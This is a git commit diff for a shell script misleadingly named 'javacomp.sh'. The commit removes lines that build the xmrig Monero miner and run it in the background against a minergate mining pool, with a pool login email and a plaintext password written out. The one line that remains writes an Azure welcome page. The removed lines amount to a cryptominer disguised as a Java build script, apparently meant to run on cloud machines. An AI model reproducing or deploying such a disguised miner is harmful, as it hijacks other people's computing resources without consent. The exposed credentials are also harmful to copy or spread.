9bd44fb95be51cffb5fb914c8c3c7145f7437537
sctrade1 <37348975+sctrade1@users.noreply.github.com>
2018-10-29 18:55:55 +0200

    Update javacomp.sh

--- javacomp.sh
+++ javacomp.sh
@@ -1,7 +1,2 @@
 #!/bin/bash
-cd xmrig
-cd build
-cmake ..
-make
-./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u zhmuha@yahoo.com -p Barb#dos66 -t 4 --donate-level=1 --av=2 -B
 echo "<html><body><h2>Welcome to Azure! My name is Scherny.</h2></body></html>" | sudo tee -a /var/www/html/index.html
